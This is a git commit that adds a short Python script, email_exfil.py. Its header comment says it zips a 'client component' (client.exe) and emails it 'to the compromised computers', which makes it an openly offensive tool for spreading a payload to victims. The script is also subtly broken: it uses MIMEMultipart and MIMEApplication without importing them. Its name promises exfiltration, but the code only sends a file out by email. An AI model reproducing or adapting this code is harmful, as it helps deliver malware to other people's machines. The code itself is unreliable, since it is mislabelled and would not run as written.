fb9f813e3fd9e0972fa270324c443c5687e0c93c
IZon Group <71234870+IZonGroup@users.noreply.github.com>
2022-12-11 16:42:34 -0500

    Create email_exfil.py

---
+++ email_exfil.py
@@ -0,0 +1,28 @@
+##This script uses the zipfile module to create a ZIP archive containing the client component files, the smtplib module to connect to the email server and send the email, and the email.message and email.mime.application modules to create and attach the email message. To use this script, you would need to modify the code to specify the correct email server, login credentials, sender and recipient addresses, and the location of the client component files on your system. You can then run the script using a Python interpreter to package and distribute the client component to the compromised computers via email.
+
+import zipfile
+import smtplib
+
+# Compress the client component files into a ZIP archive
+with zipfile.ZipFile('client_component.zip', 'w') as zip:
+    zip.write('client.exe')
+    zip.write('readme.txt')
+
+# Connect to the email server and log in
+server = smtplib.SMTP('email-server.com')
+server.login('username', 'password')
+
+# Create the email message
+msg = MIMEMultipart()
+msg['From'] = 'sender@example.com'
+msg['To'] = 'recipient@example.com'
+msg['Subject'] = 'Client Component'
+
+# Attach the client component archive to the email
+with open('client_component.zip', 'rb') as f:
+    attachment = MIMEApplication(f.read(), _subtype='zip')
+    attachment.add_header('content-disposition', 'attachment', filename='client_component.zip')
+    msg.attach(attachment)
+
+# Send the email
+server.send_message(msg)
